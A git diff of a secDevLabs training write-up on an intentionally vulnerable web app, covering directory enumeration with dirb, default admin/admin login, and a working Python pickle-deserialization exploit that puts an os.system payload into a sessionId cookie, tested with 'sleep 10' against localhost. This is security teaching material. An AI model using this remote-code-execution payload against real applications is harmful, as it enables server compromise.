@@ -5,7 +5,7 @@ If you don't know [secDevLabs] or this [intended vulnerable web application][2] 
 
 ---
 ## 👀
-
+ 
 It's possible to reach the server's web application from the HTTP port 5000, as shown by the image below:
 
 <img src="attack1.png" align="center"/>
@@ -20,14 +20,14 @@ $ dirb http://localhost:5000 ./docs/common.txt
     <img src="attack2.png"/>
 </p>
 
-When accessed, the `/admin` page exposes an authentication screen, as depicted by the image: 
+When accessed, the `/admin` page exposes an authentication screen, as depicted by the image:
 
 <p align="center">
     <img src="attack3.png"/>
 </p>
 
 ## 🔥
-
+ 
 A quick test utilizing `admin` as the credentials for the `Username` and `Password` fields gives us acess to an Admin Dashboard, as shown below:
 
 <img src="attack4.png" align="center"/>
@@ -45,14 +45,11 @@ The structure found is very similar to the ones created with the [Pickle] functi
 
 <img src="attack7.png" align="center"/>
 
-If an atacker knew that the app is using Pickle as the serialization method, he could create a malicious cookie to take advantage of it and execute code remotely. An example of the cookie is as shown:
+If an attacker knew that the app uses `Pickle` as the serialisation method, he/she could create a malicious cookie to take advantage of it and execute code remotely. An example of an exploit in Python 3 that could produce this cookie could be:
 
 ```python
 import pickle
 import os
-import datetime
-import uuid
-import subprocess
 import base64
 import sys
 import requests
@@ -60,26 +57,28 @@ import requests
 cmd = str(sys.argv[1])
 url = str(sys.argv[2])
 
+
 class Exploit(object):
     def __reduce__(self):
         return (os.system, (cmd, ))
 
+
 pickle_result = pickle.dumps(Exploit())
 
-result = base64.b64encode(pickle_result)
+result = str(base64.b64encode(pickle_result), "utf-8")
 
-print result
-print cmd
-print url
+print(result)
+print(cmd)
+print(url)
 
 cookie = {'sessionId': result}
 
-print cookie
+print(cookie)
 
 r = requests.get(url, cookies=cookie)
 ```
 
-In order to be certain that the app is exploitable, we will send a sleep command to make the app unresposive for 10 seconds. If the app takes 10 seconds to return our request, than it's confirmed, the app is exploitable. As we can see from the image below, the app takes some time to return our request, thus confirming that it is exploitable and confirming the remote code execution: 
+In order to be certain that the app is exploitable, we will send a sleep command to make the app unresposive for 10 seconds. If the app takes 10 seconds to return our request, than it's confirmed, the app is exploitable. As we can see from the image below, the app takes some time to return our request, thus confirming that it is exploitable and confirming the remote code execution:
 
 ```sh
 $ python serializaPickle.py "sleep 10" http://localhost:5000/user
